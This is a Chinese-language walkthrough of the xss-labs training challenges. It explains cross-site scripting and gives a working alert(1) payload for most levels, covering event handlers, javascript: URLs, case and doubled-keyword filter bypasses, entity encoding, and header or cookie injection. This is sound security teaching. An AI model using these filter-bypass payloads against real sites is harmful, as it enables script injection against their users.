## xss-labs



- 先讲讲什么是跨站脚本攻击XSS(Cross Site Scripting)

### XSS原理

- **本质上是针对html的一种注入攻击**，没有遵循数据与代码分离的原则，把用户输入的数据当作代码来执行
  xss跨站脚本攻击是指恶意攻击者往Web页面里插入恶意脚本代码（包括当不限于**js，flash**等等），当用户浏览该页面时，嵌入其中Web里面的脚本代码会被执行，从而达到恶意攻击用户的目的。为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，所以将跨站脚本攻击缩写为XSS。

------



### level1

<img src="https://s2.loli.net/2022/12/16/NphayjE4T9H8VGX.png" alt="image-20221216130147548" style="zoom: 25%;" />

查看题目发现，url中可以使用name传参，并且参数会回显在页面上，这就满足了xss的要求

查看源码：只要出发了alert就可以过关，于是我们构造代码：

```js
<script>alert(1)</script>
```

<img src="https://s2.loli.net/2022/12/16/JD5QfXOSxCWrKnE.png" alt="image-20221216130702842" style="zoom: 25%;" />

成功过关

<img src="https://s2.loli.net/2022/12/16/vtEimOkYP2IuRF1.png" alt="image-20221216130830506" style="zoom: 25%;" />

如图，恶意代码回显，导致恶意代码执行，造成xss漏洞





### level2

<img src="https://s2.loli.net/2022/12/16/HTpciYNWoZj2Abz.png" alt="image-20221216130953292" style="zoom: 25%;" />

<img src="https://s2.loli.net/2022/12/16/aOt1r5LvuAqBh3Q.png" alt="image-20221216131015739" style="zoom: 33%;" />

input输入框输入的值被回显到value之中，我们可以使用双引号闭合value，再使用onclick等相关事件函数进行触发相关代码：

<img src="https://s2.loli.net/2022/12/16/9t8DmKISxgbC4MP.png" alt="image-20221216131238635" style="zoom:33%;" />

![image-20221216131306391](https://s2.loli.net/2022/12/16/FvCEX6om7c2SVA1.png)

此时，当我们点击input框，即可触发事件

<img src="https://s2.loli.net/2022/12/16/i2mNbr3qDsjYIM1.png" alt="image-20221216131346797" style="zoom:25%;" />

方法二：

可以将input框闭合，使用新的标签：

```js
"><a onclick=alert(1)>hacker</a>//
```

![image-20221216131730043](https://s2.loli.net/2022/12/16/l85KPkep6hUqtWA.png)

![](https://s2.loli.net/2022/12/16/HK5bgCrGZYXcfnE.png)

此时，我们将input框闭合了,并且回显了一个新的a标签，点击即可触发事件

(使用其他的标签或事件亦可，如：img body svg input button标签等等，onload,onerror,onfocus,onmouseover 事件 等等)





### level3

本关把尖括号转移了，所以我们不能闭合标签，

我们可以闭合单引号，使用onfocus等事件

![image-20221216132341214](https://s2.loli.net/2022/12/16/wijDoOcJybC8UaZ.png)

xss代码：

```js
' onfocus=alert(1) '
```



![image-20221216132607274](https://s2.loli.net/2022/12/16/k4OSlw2bzWrC8vB.png)

当焦点在input框中即可触发事件



### level4

和上一关一样，只不过闭合双引号

![image-20221216132833965](https://s2.loli.net/2022/12/16/AOsm1hyJkvLPiUC.png)





### level5

这一关把on给过滤了

![image-20221216133058825](https://s2.loli.net/2022/12/16/lwGdT4LMQicnHuf.png)

< script 也过滤了

![image-20221216133403349](https://s2.loli.net/2022/12/16/TZCfbcpD3YH5sGz.png)



我们可以使用JavaScript伪协议

```js
伪协议是为关联应用程序而使用的，JavaScript伪协议实际上是把
javascript:后面的代码当JavaScript来执行，并将结果值返回给当前页面。 将javascript代码添加到客户端的方法是把它放置在伪协议说明符
javascript:后的URL中。 这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript
的解释器运行。
```



![image-20221216133834460](https://s2.loli.net/2022/12/16/ClqQ4MReETmf7pb.png)



xss代码：

```js
"><a href=javascript:alert(1)>hacker</a>//
或
"><iframe src=javascript:alert(1)></iframe>//
```

此处js伪协议写在a标签的href属性中，将Javascript后面的代码当作js代码执行

![image-20221216134224702](https://s2.loli.net/2022/12/16/vI72DbydkQp8ZJ1.png)





### level6

过滤更多了，我们尝试上一题方法，发现href被过滤，我们尝试大小写绕过：hRef发现可行

![image-20221216134918561](https://s2.loli.net/2022/12/16/WoTpE6GDnc29zxM.png)



![image-20221216135032318](https://s2.loli.net/2022/12/16/wUvW6c3qKbCOEJy.png)

xss:

```js
"><a hRef=javascript:alert(1)>hacker</a>//
```



### level7

```js
" oonnclick=alert(1) "
或
"><scrscriptipt>alert(1)</scrscriptipt>
```

双写绕过，此处将on，script替换为空

![image-20221216140256840](https://s2.loli.net/2022/12/16/jte8obr5QPARxOd.png)





### level8

这一关我们输入的参数会当作下面a标签的href地址，于是我们可以使用js伪协议：

```
javascript:alert(1)
```

![image-20221216140901188](https://s2.loli.net/2022/12/16/KMrCpYguPnbNsJq.png)



但是查看源码发现：

![image-20221216141207967](https://s2.loli.net/2022/12/16/2UzTWPfC8FaynuH.png)



script被过滤了

于是我们想到了**html实体编码**：

将s进行编码，可得：&# x0073;

html会将该编码识别为字母： s



于是xss代码为：

```js
java&#x0073;cript:alert(1)
```



[参考链接：](https://blog.csdn.net/aleave/article/details/119853620)



#### 什么是html实体编码？

```html
HTML 实体是一段以连字号（&）开头、以分号（;）结尾的字符串。用以显示不可见字符及保留字符 (如 HTML 标
签)
在前端，一般为了避免 XSS 攻击，会将 < > 编码为 &lt; 与 &gt;，这些就是 HTML 实体编码。
```

实体编码后，字符就变成了普通的字符，引号不能去闭合其他的引号，只是一个普通字符。





#### HTML编码有以下几种方式

1. ​    HTML实体编码，格式    `以&符号开头，以;分号结尾的`   

   ```html
   <textarea name="" id="textarea" cols="30" rows="10">
       &lt;img src=&quot;localhost&quot;&gt;
    </textarea>
   ```

   结果是：   

   ```html
   <img src="localhost">
   ```

2. ​    十进制的ASCLL编码,格式:    `以符号&#开头，分号;结尾`   

​    ascll编码对照表   

```html
<textarea name="" id="textarea" cols="30" rows="10">
    &#60;&#105;mg src&#61;"localhost"&#62;
  </textarea>
```

3、Unicode字符编码,格式:    `以符号&#开头，分号;结尾`

```
  <textarea name="" id="textarea" cols="30" rows="10">
    <img src&#0061;&#0034;localhost&#0034;>
  </textarea>
```

4、十六进制的ascll码，格式：    `以&#x开头，分号;结尾`

```html
<textarea name="" id="textarea" cols="30" rows="10">
    <img src&#x3D;&#x0022;localhost&#x0022;>
  </textarea>
```







### level9

题目描述与上题类似，但是查看源码，

![image-20221216142830957](https://s2.loli.net/2022/12/16/HRO8Jz2XPnFAkM5.png)

提示链接不合法，于是我们推断可能链接需要有 http://  标识

```js
javascript:alert('http://')
```

并且将 s 进行编码：

xss：

```js
java&#x0073;cript:alert('http://')
```



[编码网址](http://www.jsons.cn/unicode)





### level10

查看源代码：

![image-20221216151725316](https://s2.loli.net/2022/12/16/QNczWPfLryZTpUi.png)

经过尝试，我们可以向 t_sort 输入框传入值，将 "  进行闭合，使用 onclick事件，并且将type进行显示

xss代码：

```js
?t_sort=" onclick=alert(1) type="text" "
```



前面的type将后面的type给覆盖了，于是input框就回显出来了

![image-20221216152135827](https://s2.loli.net/2022/12/16/WMEzZ791lRpkJst.png)





### level11

查看源码：

![image-20221216152300184](https://s2.loli.net/2022/12/16/LNJQ9MABwG1YRak.png)



发现，t_ref 输入框的value值为 前一个页面的url值

有经验可知，该value值应该为请求头中的 Referer

于是我们使用bp抓包

<img src="https://s2.loli.net/2022/12/16/DiXYrtRF2IZw4VG.png" alt="image-20221216152619800" style="zoom: 33%;" />



我们可以修改Referer值，将引号闭合，使用相关事件：

![image-20221216152809029](https://s2.loli.net/2022/12/16/T1MRsJo8ECgl67q.png)



![image-20221216152828401](https://s2.loli.net/2022/12/16/DOwaFXVn8B4e369.png)



xss代码：

```js
" onmouseover=alert(1) type="text" "
```





### level12

查看源码：

![image-20221216152916353](https://s2.loli.net/2022/12/16/OpUA2KIQFk9onaT.png)

发现value值为 UA，于是bp抓包修改ua头即可，与上题类似





### level13



bp抓包

![image-20221216153048456](https://s2.loli.net/2022/12/16/SkomEfxwVBsqdJz.png)



该题为注入点在cookie

```js
" onmouseover=alert(1) type="text" "
```





### level14

加载不了



### level15

查看源码：

![image-20221216154043491](https://s2.loli.net/2022/12/16/f5G7dKJQBZ8pPMi.png)



[AngularJS `ng-include` 指令](https://www.runoob.com/angularjs/ng-ng-include.html)



**ng-include**指令用于包含外部的 HTML 文件。

包含的内容将作为指定元素的子节点。

`ng-include`属性的值可以是一个表达式，返回一个文件名。

默认情况下，包含的文件需要包含在同一个域名下。

**payload ** 我们包含第一关的漏洞即可



```js
?src='level1.php?name=<a href=javascript:alert(1)>aa</a>'
```





### level16

查看源码：

![image-20221216155234482](https://s2.loli.net/2022/12/16/iZfs3EXmhdFt2l7.png)

过滤了一些符号，以及script

由于过滤了 / 斜杠，我们可以使用单标签，如 img，但是此处将空格过滤了，我们可以使用 %0a，%0c，%0d等等  进行分隔

于是构造xss

```js
?keyword=<img%0Dsrc=x%0Aonerror=alert(1)>
```





### level17

我们发现，参数的值都传入了 src 中



![image-20221216160006380](https://s2.loli.net/2022/12/16/Vln4xw39Z1KB2au.png)



观察可知，该处src 没有加引号，可以使用空格分隔，利用拼接，巧妙解题

构造xss

![image-20221216160748771](https://s2.loli.net/2022/12/16/FvaVjmQJ6wLd3Ic.png)

我们使用google查看，鼠标移入该区域即可过关

![image-20221216160829527](https://s2.loli.net/2022/12/16/nlYeDauG91IhBpF.png)



### level18

与上题一样



### level19，20

先放着